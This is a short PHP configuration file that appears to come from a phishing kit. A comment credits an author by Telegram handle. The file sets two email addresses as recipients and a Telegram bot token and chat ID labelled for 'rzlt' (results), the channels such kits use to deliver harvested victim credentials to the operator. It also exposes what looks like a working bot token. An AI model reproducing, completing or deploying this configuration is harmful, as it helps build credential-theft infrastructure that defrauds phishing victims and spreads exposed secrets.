<?php
/*
  //||~~ By ~~ USAA ~~\\         			       	                
 // Telegram Id: @USAA \\	
*/

$send ="draculaking01@vivaldi.net,draculakng01@gmail.com"; 

//telgram rzlt
$api = "6641234955:AAF6QrQmZDX-A3plQbzLXYAntc7d6rMwoH0";
$chatid = "6648297866";


?>